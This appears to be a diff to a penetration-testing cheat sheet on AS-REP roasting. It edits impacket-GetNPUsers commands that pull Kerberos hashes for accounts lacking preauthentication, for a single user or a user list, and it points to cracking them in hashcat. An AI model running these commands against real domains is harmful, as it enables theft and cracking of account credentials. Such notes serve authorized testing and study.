@@ -8,8 +8,11 @@ Queries target domain for users with 'Do not require Kerberos preauthentication'
 ## Capabilities
 
 ```bash
-# Pull 
-impacket-GetNPUsers -request -dc-ip $IP -outputfile hashes.asreproast $DOMAIN/$USER
+# Check a single user
+impacket-GetNPUsers -dc-ip $IP -outputfile hashes.asreproast $DOMAIN/$USER
+
+# Check a list of users
+impacket-GetNPUsers -dc-ip $IP -usersfile users.txt -outputfile hashes.asreproast $DOMAIN/
 ```
 
 Crack the hash in hashcat
